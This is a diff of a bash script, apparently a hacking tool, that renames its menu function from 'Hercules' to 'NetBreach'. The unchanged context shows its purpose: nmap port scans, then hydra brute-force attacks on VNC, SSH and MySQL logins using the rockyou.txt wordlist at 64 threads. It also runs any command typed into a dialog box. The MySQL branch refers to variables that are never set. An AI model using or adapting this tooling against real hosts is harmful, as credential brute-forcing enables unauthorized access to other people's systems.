@@ -53,10 +53,10 @@ else
     if [[ "$OSTYPE" == "${OS}"* ]]; then
 
         # Function to scan ports
-        Hercules() {
-            figlet -f slant "Hercules"
+        NetBreach() {
+            figlet -f slant "NetBreach"
             options_text="Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'.\nIf you want to stop the program, type 'stop'."
-            service=$(zenity --entry --title "Hercules" --text "$options_text" --entry-text "")
+            service=$(zenity --entry --title "NetBreach" --text "$options_text" --entry-text "")
             
             if [[  " ${exit[*]} " == *" ${service} "* ]]; then
                 echo 
@@ -67,7 +67,7 @@ else
             if [[ "${service}" == "ALL" || "${service}" == "all" ]]; then
                 echo -e "[-] Exiting program..."
                 # Scan all ports
-                zenity --info --title "Hercules" --text "Scanning all ports. This may take up to 1 hour to complete." --timeout=5
+                zenity --info --title "NetBreach" --text "Scanning all ports. This may take up to 1 hour to complete." --timeout=5
                 sudo nmap 127.0.0.1/24 -Pn -oN scan.txt --open
 
                 zenity --info --title "INFO" --text "Put in Hydra first to start the script." --timeout=5
@@ -75,20 +75,20 @@ else
                 GUI_HYDRA=$(zenity --entry --title "hydra" --text "$hydraInputField" --entry-text "")
 
                 if [[ " ${exit[*]} " == *" ${GUI_HYDRA} "* ]]; then
-                    zenity --info --title "Hercules" --text "Stopping program."
+                    zenity --info --title "NetBreach" --text "Stopping program."
                     exit 1
                 else
                     $GUI_HYDRA
                     exit 1
                 fi
             elif [[ " ${exit[*]} " == *" ${service} "* ]]; then
-                zenity --info --title "Hercules" --text "Stopping program."
+                zenity --info --title "NetBreach" --text "Stopping program."
                 exit 1
             elif [[ "${service}" == "" ]]; then
                 zenity --error --title "ERROR" --text "Please input a number into the input field."
-                Hercules
+                NetBreach
             else
-                zenity --info --title "Hercules" --text "Scanning port ${service}." --timeout=5
+                zenity --info --title "NetBreach" --text "Scanning port ${service}." --timeout=5
                 nmap 127.0.0.1 -p "${service}" --open
             fi
         }
@@ -119,7 +119,7 @@ else
             if [[ $service == 5900 || $service == "VNC" ]]; then
                 if [[ $user == "" && $host == "" || $host == "" ]]; then
                     zenity --info --title="SERVICE" --text="No service specified"
-                    Hercules
+                    NetBreach
                 else
                     # Crack VNC password
                     hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://"$host"
@@ -141,7 +141,7 @@ else
             if [[ $service == 22 || $service == "SSH" ]]; then
                 if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                     zenity --info --title="SERVICE" --text="No service specified"
-                    Hercules
+                    NetBreach
                 else
                     # Crack SSH password
                     hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"${host}"
@@ -162,7 +162,7 @@ else
             if [[ $service == 3306 || $service == "mysql" ]]; then
                 if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                     zenity --info --title="SERVICE" --text="No service specified"
-                    Hercules
+                    NetBreach
                 else
                     # Crack MySQL password
                     hydra -l "$userName" -P rockyou.txt -t 64 -vV -o output.log -I mysql://"${hostName}"
@@ -176,7 +176,7 @@ else
         }
 
         # Call functions in order
-        Hercules
+        NetBreach
         RunHackingCommand
         RunHackingCommandWithVNC
         RunHackingCommandWithSSH
